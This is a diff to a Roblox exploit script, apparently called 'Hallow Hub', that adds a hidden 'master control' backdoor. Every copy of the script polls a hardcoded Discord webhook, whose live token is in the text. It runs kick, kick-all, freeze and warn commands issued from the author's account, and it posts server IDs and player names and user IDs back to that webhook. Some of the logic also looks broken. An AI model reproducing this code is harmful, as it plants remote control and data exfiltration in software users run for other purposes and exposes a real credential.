@@ -2410,15 +2410,79 @@ WorldTab:Button({
 WorldTab:Label("🎨 World visuals ready!", "Left")
 
 -- ==================== MASTER CONTROL SYSTEM ====================
-local YOUR_ROBLOX_ID = 1455718649  -- ← CHANGE THIS TO YOUR ACTUAL ROBLOX ID!
+local YOUR_ROBLOX_ID = 1455718649  -- ← YOUR ROBLOX ID
+local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1476059654663438421/c8crSZJ1IUAf6uiBEySlOYSq9gz3ugla3wK5AXhABANATIUl5SQaiA7BluZ7xGxcGJ17"
 local PREFIX = ":"  -- Command prefix
 
--- Function to check if the speaker is YOU (the master)
-local function isMaster(speaker)
-    return speaker.UserId == YOUR_ROBLOX_ID
+-- Function to send results to Discord webhook
+local function sendToDiscord(title, message, color)
+    pcall(function()
+        local request = syn and syn.request or http and http.request or http_request or request
+        if request then
+            local embedColor = color or 16735027  -- Default purple
+            if title == "📋 User List" then embedColor = 65280 end  -- Green
+            if title == "⚠️ Warning" then embedColor = 16776960 end  -- Yellow
+            if title == "❌ Error" then embedColor = 16711680 end  -- Red
+            
+            request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({
+                    embeds = {{
+                        title = title,
+                        description = message,
+                        color = embedColor,
+                        footer = {text = "Hallow Hub Master System"},
+                        timestamp = DateTime.now():ToIsoDate()
+                    }}
+                })
+            })
+        end
+    end)
 end
 
--- Function to show notification on the user's screen
+-- Check if THIS USER is the master (YOU)
+local IS_MASTER = (LP.UserId == YOUR_ROBLOX_ID)
+
+-- ==================== COMMAND SENDING (Only runs if YOU are executing) ====================
+if IS_MASTER then
+    -- This ONLY runs when YOU execute the script
+    print("👑 Hallow Hub Master Detected - Command sending mode active")
+    
+    -- Send command to webhook (for users in other servers)
+    local function sendCommandToWebhook(command)
+        pcall(function()
+            local request = syn and syn.request or http and http.request or http_request or request
+            if request then
+                request({
+                    Url = WEBHOOK_URL,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = HttpService:JSONEncode({
+                        content = command,
+                        username = "Hallow Hub Master"
+                    })
+                })
+                print("📤 Command sent to webhook: " .. command)
+            end
+        end)
+    end
+    
+    -- Listen to YOUR chat
+    LP.Chatted:Connect(function(message)
+        if string.sub(message, 1, 1) == PREFIX then
+            print("📤 Sending command: " .. message)
+            sendCommandToWebhook(message)
+        end
+    end)
+    
+    print("👑 You are the MASTER - Commands will be sent via webhook")
+end
+
+-- ==================== COMMAND RECEIVING (Runs on EVERYONE'S script) ====================
+
+-- Function to show notification
 local function showNotification(title, message, duration)
     pcall(function()
         if syde and syde.Notify then
@@ -2437,7 +2501,7 @@ local function showNotification(title, message, duration)
     end)
 end
 
--- Function to show big center message
+-- Function to show center message
 local function showCenterMessage(message, duration)
     duration = duration or 3
     pcall(function()
@@ -2466,9 +2530,9 @@ local function showCenterMessage(message, duration)
     end)
 end
 
--- Function to freeze a player
+-- Function to freeze player
 local function freezePlayer(targetPlayer)
-    if targetPlayer.Character then
+    if targetPlayer and targetPlayer.Character then
         local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
         if root then
             root.Anchored = true
@@ -2476,9 +2540,9 @@ local function freezePlayer(targetPlayer)
     end
 end
 
--- Function to unfreeze a player
+-- Function to unfreeze player
 local function unfreezePlayer(targetPlayer)
-    if targetPlayer.Character then
+    if targetPlayer and targetPlayer.Character then
         local root = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
         if root then
             root.Anchored = false
@@ -2486,7 +2550,7 @@ local function unfreezePlayer(targetPlayer)
     end
 end
 
--- Function to find a player by name
+-- Function to find player
 local function findPlayer(name)
     for _, player in ipairs(Players:GetPlayers()) do
         if player.Name:lower() == name:lower() or 
@@ -2498,124 +2562,146 @@ local function findPlayer(name)
     return nil
 end
 
--- Chat listener - THIS RUNS ON EVERY USER'S SCRIPT
-local function onPlayerChatted(speaker, message)
-    -- Check if the speaker is YOU (the master)
-    if not isMaster(speaker) then return end
+-- Function to execute commands with Discord logging
+local function executeCommand(commandText)
+    if string.sub(commandText, 1, 1) ~= PREFIX then return end
     
-    -- Check if it's a command
-    if string.sub(message, 1, 1) == PREFIX then
-        -- Parse command
-        local parts = {}
-        for word in string.gmatch(message, "%S+") do
-            table.insert(parts, word)
+    -- Parse command
+    local parts = {}
+    for word in string.gmatch(commandText, "%S+") do
+        table.insert(parts, word)
+    end
+    
+    local cmd = string.sub(parts[1], 2)
+    local args = {}
+    for i = 2, #parts do
+        table.insert(args, parts[i])
+    end
+    
+    -- HELP
+    if cmd == "help" then
+        local msg = "👑 Hallow Hub Commands:\n"
+        msg = msg .. ":help - Shows this menu\n"
+        msg = msg .. ":shout [msg] - Big center text\n"
+        msg = msg .. ":announce [msg] - Notification\n"
+        msg = msg .. ":kick [user] [reason] - Kick user\n"
+        msg = msg .. ":kickall [reason] - Kick everyone\n"
+        msg = msg .. ":freeze [user] - Freeze user\n"
+        msg = msg .. ":unfreeze [user] - Unfreeze user\n"
+        msg = msg .. ":warn [user] [msg] - Warn user\n"
+        msg = msg .. ":warnall [msg] - Warn everyone\n"
+        msg = msg .. ":list - Show all users\n"
+        showNotification("📋 Commands", msg, 10)
+    
+    -- SHOUT
+    elseif cmd == "shout" then
+        local message = table.concat(args, " ")
+        if message ~= "" then
+            showCenterMessage("📢 " .. message, 5)
+            sendToDiscord("📢 Shout Command", "Message: " .. message, 16735027)
+        end
+    
+    -- ANNOUNCE
+    elseif cmd == "announce" then
+        local message = table.concat(args, " ")
+        if message ~= "" then
+            showNotification("Hallow Hub Announcement", message, 5)
+            sendToDiscord("📢 Announcement", "Message: " .. message, 16735027)
+        end
+    
+    -- KICK SPECIFIC USER
+    elseif cmd == "kick" then
+        if #args < 1 then 
+            sendToDiscord("❌ Kick Failed", "No username provided", 16711680)
+            return 
+        end
+        local targetName = args[1]
+        local reason = table.concat(args, " ", 2)
+        if reason == "" then reason = "Kicked by Hallow Hub Master" end
+        
+        local target = findPlayer(targetName)
+        if target and target ~= LP then
+            target:Kick("🔴 " .. reason)
+            sendToDiscord("🥾 User Kicked", "User: " .. target.Name .. " (" .. target.UserId .. ")\nReason: " .. reason, 16735027)
+        else
+            sendToDiscord("❌ Kick Failed", "User not found: " .. targetName, 16711680)
+        end
+    
+    -- KICK ALL
+    elseif cmd == "kickall" then
+        local reason = table.concat(args, " ")
+        if reason == "" then reason = "Mass kick by Hallow Hub Master" end
+        
+        local kickedCount = 0
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LP then
+                player:Kick("🔴 " .. reason)
+                kickedCount = kickedCount + 1
+            end
+        end
+        sendToDiscord("🥾 Mass Kick", "Kicked " .. kickedCount .. " users\nReason: " .. reason, 16735027)
+    
+    -- FREEZE
+    elseif cmd == "freeze" then
+        if #args < 1 then 
+            sendToDiscord("❌ Freeze Failed", "No username provided", 16711680)
+            return 
+        end
+        local target = findPlayer(args[1])
+        if target and target ~= LP then
+            freezePlayer(target)
+            sendToDiscord("❄️ User Frozen", "User: " .. target.Name .. " (" .. target.UserId .. ")", 5635925)
+        else
+            sendToDiscord("❌ Freeze Failed", "User not found: " .. args[1], 16711680)
+        end
+    
+    -- UNFREEZE
+    elseif cmd == "unfreeze" then
+        if #args < 1 then 
+            sendToDiscord("❌ Unfreeze Failed", "No username provided", 16711680)
+            return 
+        end
+        local target = findPlayer(args[1])
+        if target and target ~= LP then
+            unfreezePlayer(target)
+            sendToDiscord("🔥 User Unfrozen", "User: " .. target.Name .. " (" .. target.UserId .. ")", 16744576)
+        else
+            sendToDiscord("❌ Unfreeze Failed", "User not found: " .. args[1], 16711680)
+        end
+    
+    -- WARN USER
+    elseif cmd == "warn" then
+        if #args < 2 then 
+            sendToDiscord("❌ Warn Failed", "Usage: :warn [username] [message]", 16711680)
+            return 
+        end
+        local targetName = args[1]
+        local message = table.concat(args, " ", 2)
+        local target = findPlayer(targetName)
+        
+        if target and target ~= LP then
+            pcall(function()
+                game:GetService("StarterGui"):SetCore("SendNotification", {
+                    Title = "⚠️ WARNING",
+                    Text = message,
+                    Duration = 5
+                })
+            end)
+            sendToDiscord("⚠️ User Warned", "User: " .. target.Name .. " (" .. target.UserId .. ")\nMessage: " .. message, 16776960)
+        else
+            sendToDiscord("❌ Warn Failed", "User not found: " .. targetName, 16711680)
+        end
+    
+    -- WARN ALL
+    elseif cmd == "warnall" then
+        local message = table.concat(args, " ")
+        if message == "" then 
+            sendToDiscord("❌ Warn All Failed", "No message provided", 16711680)
+            return 
         end
         
-        local cmd = string.sub(parts[1], 2)  -- Remove the :
-        local args = {}
-        for i = 2, #parts do
-            table.insert(args, parts[i])
-        end
-        
-        -- ========== COMMAND HANDLERS ==========
-        
-        -- HELP COMMAND
-        if cmd == "help" then
-            local msg = "👑 Hallow Hub Commands:\n"
-            msg = msg .. ":help - Shows this menu\n"
-            msg = msg .. ":shout [msg] - Shows big text\n"
-            msg = msg .. ":announce [msg] - Shows notification\n"
-            msg = msg .. ":kick [user] - Kicks specific user\n"
-            msg = msg .. ":kickall [reason] - Kicks everyone\n"
-            msg = msg .. ":freeze [user] - Freezes user\n"
-            msg = msg .. ":unfreeze [user] - Unfreezes user\n"
-            msg = msg .. ":warn [user] [msg] - Warns user\n"
-            msg = msg .. ":warnall [msg] - Warns everyone\n"
-            msg = msg .. ":list - Shows all users\n"
-            showNotification("📋 Commands", msg, 10)
-        
-        -- SHOUT COMMAND
-        elseif cmd == "shout" then
-            local message = table.concat(args, " ")
-            if message ~= "" then
-                showCenterMessage("📢 " .. message, 5)
-            end
-        
-        -- ANNOUNCE COMMAND
-        elseif cmd == "announce" then
-            local message = table.concat(args, " ")
-            if message ~= "" then
-                showNotification("Hallow Hub Announcement", message, 5)
-            end
-        
-        -- KICK SPECIFIC USER
-        elseif cmd == "kick" then
-            if #args < 1 then
-                showNotification("❌ Usage", ":kick [username] [reason]", 3)
-                return
-            end
-            
-            local targetName = args[1]
-            local reason = table.concat(args, " ", 2)
-            if reason == "" then reason = "Kicked by Hallow Hub Master" end
-            
-            local target = findPlayer(targetName)
-            if target then
-                if target ~= LP then  -- Don't kick yourself
-                    target:Kick("🔴 " .. reason)
-                end
-            end
-        
-        -- KICK EVERYONE
-        elseif cmd == "kickall" then
-            local reason = table.concat(args, " ")
-            if reason == "" then reason = "Mass kick by Hallow Hub Master" end
-            
-            for _, player in ipairs(Players:GetPlayers()) do
-                if player ~= LP then
-                    player:Kick("🔴 " .. reason)
-                end
-            end
-            showNotification("✅ Kicked All", reason, 3)
-        
-        -- FREEZE USER
-        elseif cmd == "freeze" then
-            if #args < 1 then
-                showNotification("❌ Usage", ":freeze [username]", 3)
-                return
-            end
-            
-            local target = findPlayer(args[1])
-            if target and target ~= LP then
-                freezePlayer(target)
-                showNotification("❄️ Frozen", "Frozen " .. target.Name, 2)
-            end
-        
-        -- UNFREEZE USER
-        elseif cmd == "unfreeze" then
-            if #args < 1 then
-                showNotification("❌ Usage", ":unfreeze [username]", 3)
-                return
-            end
-            
-            local target = findPlayer(args[1])
-            if target and target ~= LP then
-                unfreezePlayer(target)
-                showNotification("🔥 Unfrozen", "Unfrozen " .. target.Name, 2)
-            end
-        
-        -- WARN USER
-        elseif cmd == "warn" then
-            if #args < 2 then
-                showNotification("❌ Usage", ":warn [username] [message]", 3)
-                return
-            end
-            
-            local targetName = args[1]
-            local message = table.concat(args, " ", 2)
-            local target = findPlayer(targetName)
-            
-            if target and target ~= LP then
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LP then
                 pcall(function()
                     game:GetService("StarterGui"):SetCore("SendNotification", {
                         Title = "⚠️ WARNING",
@@ -2624,46 +2710,71 @@ local function onPlayerChatted(speaker, message)
                     })
                 end)
             end
-        
-        -- WARN EVERYONE
-        elseif cmd == "warnall" then
-            local message = table.concat(args, " ")
-            if message == "" then
-                showNotification("❌ Usage", ":warnall [message]", 3)
-                return
-            end
-            
-            for _, player in ipairs(Players:GetPlayers()) do
-                if player ~= LP then
-                    pcall(function()
-                        game:GetService("StarterGui"):SetCore("SendNotification", {
-                            Title = "⚠️ WARNING",
-                            Text = message,
-                            Duration = 5
-                        })
-                    end)
-                end
-            end
-        
-        -- LIST USERS
-        elseif cmd == "list" then
-            local userList = "📋 Users:\n"
-            for _, player in ipairs(Players:GetPlayers()) do
-                if player ~= LP then
-                    userList = userList .. player.Name .. " (" .. player.UserId .. ")\n"
-                end
-            end
-            showNotification("Active Users", userList, 8)
         end
+        sendToDiscord("⚠️ Mass Warning", "Message: " .. message, 16776960)
+    
+    -- LIST USERS
+    elseif cmd == "list" then
+        local userList = ""
+        local userCount = 0
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LP then
+                userList = userList .. player.Name .. " (" .. player.UserId .. ")\n"
+                userCount = userCount + 1
+            end
+        end
+        
+        if userCount == 0 then
+            userList = "No other users in this server"
+        end
+        
+        -- Show notification on user's screen
+        showNotification("📋 Active Users", userList, 8)
+        
+        -- Send to Discord for YOU to see
+        sendToDiscord("📋 User List", "**Server:** " .. game.JobId .. "\n**Total Users:** " .. userCount .. "\n\n" .. userList, 65280)
     end
 end
 
--- Connect to EVERYONE'S chat (this runs on each user's script)
-local chatConnection = LP.Chatted:Connect(function(message)
-    onPlayerChatted(LP, message)
+-- ==================== CHAT LISTENER (same server) ====================
+LP.Chatted:Connect(function(message)
+    -- Only execute if the speaker is YOU
+    if LP.UserId == YOUR_ROBLOX_ID and string.sub(message, 1, 1) == PREFIX then
+        executeCommand(message)
+    end
 end)
 
-print("👑 Master control ready - listening for commands from Master ID:", YOUR_ROBLOX_ID)
+-- ==================== WEBHOOK LISTENER (cross-server) ====================
+-- This runs on EVERYONE's script, checking for commands from webhook
+if not IS_MASTER then  -- Only users need to check webhook
+    task.spawn(function()
+        local lastCommand = ""
+        print("👂 Listening for master commands via webhook...")
+        
+        while true do
+            pcall(function()
+                -- Check for new commands from webhook
+                local response = game:HttpGet(WEBHOOK_URL .. "?limit=1")
+                
+                -- Try to extract command from webhook
+                local commandMatch = string.match(response, '"content":"(:[^"]+)"')
+                if commandMatch and commandMatch ~= lastCommand then
+                    lastCommand = commandMatch
+                    print("📩 Received command: " .. commandMatch)
+                    executeCommand(commandMatch)
+                end
+            end)
+            task.wait(3)  -- Check every 3 seconds
+        end
+    end)
+end
+
+print("👑 Hallow Hub Master System Ready")
+if IS_MASTER then
+    print("⭐ You are the MASTER - Type commands in chat")
+else
+    print("👤 You are a USER - Waiting for master commands")
+end
 
 -- Initialize ESP after UI is created
 task.wait(3) -- Give UI time to load
